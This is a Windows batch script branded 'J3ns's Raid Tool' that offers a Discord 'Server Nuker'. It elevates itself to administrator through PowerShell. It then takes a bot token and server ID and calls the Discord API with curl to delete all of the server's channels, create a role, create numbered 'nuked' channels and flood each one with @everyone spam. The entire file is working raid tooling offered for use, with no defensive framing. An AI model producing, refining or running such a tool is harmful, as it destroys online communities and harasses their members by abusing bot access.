@echo off
:: Request Admin Privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting Admin Privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~0' -Verb RunAs"
    exit
)

mode con: cols=80 lines=25
title J3ns's Raid Tool
color 0a
setlocal EnableDelayedExpansion
set tempfolder=%temp%\raidtool
mkdir %tempfolder% 2>nul

:menu
cls
echo ================================
echo      J3NS'S RAIDER TOOL
echo ================================
echo [1] Server Nuker
echo [0] Exit
set /p option=Select Option: 
if "%option%"=="1" goto nuker
if "%option%"=="0" exit

:nuker
cls
echo Server Nuker
set /p token=Enter Bot Token: 
set /p serverid=Enter Server ID: 
set /p count=How Many Channels: 
set /p spammsg=Enter Spam Message: 
set /p rolename=Enter Role Name: 

:: Delete all channels
echo Deleting all channels...
curl -X GET https://discord.com/api/v9/guilds/%serverid%/channels -H "Authorization: Bot %token%" -H "Content-Type: application/json" > %tempfolder%\channels.json
for /f "tokens=2 delims=:," %%i in ('findstr "id" %tempfolder%\channels.json') do (
    set "channelid=%%i"
    set "channelid=!channelid:~1,-1!"
    curl -X DELETE https://discord.com/api/v9/channels/!channelid! -H "Authorization: Bot %token%" -H "Content-Type: application/json"
    timeout 1 >nul
)

:: Creating Roles
echo Creating Roles...
curl -X POST https://discord.com/api/v9/guilds/%serverid%/roles -H "Authorization: Bot %token%" -H "Content-Type: application/json" -d "{\"name\":\"%rolename%\"}"

:: Creating New Channels and Spamming Messages
for /l %%a in (1,1,%count%) do (
    echo Creating channel nuked%%a...
    curl -X POST https://discord.com/api/v9/guilds/%serverid%/channels -H "Authorization: Bot %token%" -H "Content-Type: application/json" -d "{\"name\":\"nuked%%a\"}" > %tempfolder%\channel_created.json
    if exist %tempfolder%\channel_created.json (
        for /f "tokens=2 delims=:," %%i in ('findstr "id" %tempfolder%\channel_created.json') do (
            set "newchannelid=%%i"
            set "newchannelid=!newchannelid:~1,-1!"
            echo Spamming messages in nuked%%a...
            for /l %%b in (1,1,10) do (
                curl -X POST https://discord.com/api/v9/channels/!newchannelid!/messages -H "Authorization: Bot %token%" -H "Content-Type: application/json" -d "{\"content\":\"@everyone %spammsg%\"}"
                timeout 1 >nul
            )
        )
    ) else (
        echo Failed to create channel nuked%%a
    )
)
pause
goto menu
